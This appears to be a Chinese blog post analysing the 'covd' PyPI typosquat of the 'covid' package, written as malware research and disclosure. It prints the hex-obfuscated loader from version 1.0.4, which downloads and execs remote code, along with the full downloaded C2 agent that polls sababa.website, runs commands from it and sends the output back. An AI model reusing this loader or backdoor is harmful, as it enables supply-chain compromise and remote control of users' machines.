 

腾讯发现pypi的官方包投毒事件https://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&mid=2651202917&idx=1&sn=d3ea45078ee4e311214b1209c0487801

第一时间看了下，这已经不是第一次遭遇投毒了，上次还是更有名的requests的投毒，就少拼写一个字符。

这次是利用疫情期间的有人编写covid库，方便获取实时的疫情信息状态。


## 0x01 事件描述

11月16号 17:02 攻击者在PyPI官方仓库上传了`covd` 恶意包，该恶意包通过伪造`covid`包名进行钓鱼，攻击者可对受感染的主机进行入侵，并实施种植木马、命令控制等一系列活动，其中恶意代码存在于`1.0.2/4`版本中。

正常 covid 包的功能是获取约翰斯·霍普金斯大学和worldometers.info提供的有关新型冠状病毒的信息，每天的安装量上千次。在新冠疫情在世界流行的大背景下，`covid`包因输错包名而被误装为covd钓鱼包的数量将会不断增加。

## 复现内容
然后去复现了一下。

这里文章中给出的版本号是`1.0.4`

去官网找到`covd`的源码https://pypi.org/project/covd/，发现已经更新到`1.0.5`版本，将其最新版本下载，然后再下载一个历史版本https://pypi.org/project/covd/#history，看到原作者在16号-17号短短两天就添加了5个版本。下载`1.0.4`版本。

另外下载了https://pypi.org/project/covid/ 的源码进行对比。


使用解压文件获得源码，在`1.0.4`中的`__init__.py`文件中显示

```
__license__ = "MIT"
__version__ = "1.0.4"

try:
    getattr(builtins, bytes.fromhex('65786563').decode())(r.get(bytes.fromhex('687474703a2f2f612e7361626162612e776562736974652f676574').decode()).text)
except:
    pass

```

使用hex解码
```
65786563
exec
```
```
687474703a2f2f612e7361626162612e776562736974652f676574
http://a.sababa.website/get
```

通过builtins内置函数exec执行requests方法下载get文件内容，其中get文件的内容为：

```
def __agent():
    try:
        from urllib import request
        import json
        import subprocess
        while True:
            req = request.Request("https://sababa.website/api/ready", method="POST")
            r = request.urlopen(req)
            response = r.read()
            if response:
                task = json.loads(response.decode())
                try:
                    process = subprocess.Popen(task['command'], stderr=subprocess.PIPE, stdout=subprocess.PIPE, cwd=task.get('working_directory'))
                    stdout, stderr = process.communicate()
                    stdout = stdout.decode()
                    stderr = stderr.decode()
                    exit_code = process.wait()
                except Exception as e:
                    stdout = ''
                    stderr = str(e)
                    exit_code = 155

                data = {'task': task, 'exit_code': exit_code, 'stdout': stdout, 'stderr': stderr}
                data = json.dumps(data).encode()
                request.urlopen(request.Request('https://sababa.website/api/done', method="POST"), data=data)

    except Exception as e:
        raise

import threading
threading.Thread(target=__agent, daemon=True).start()
```

这个文件会立即启动一个线程，执行__agent函数

⽊⻢会循环向命令C2服务器( https://sababa.website/api/ready ) 询问需要执⾏的命令，并将命令执⾏的结果以json的形式 返回给另⼀个命令C2服务器(https://sababa.website/api/done ) 。


投毒的常见手法：
eval 执行一段话的明文木马
exec 执行一段加密的木马文本
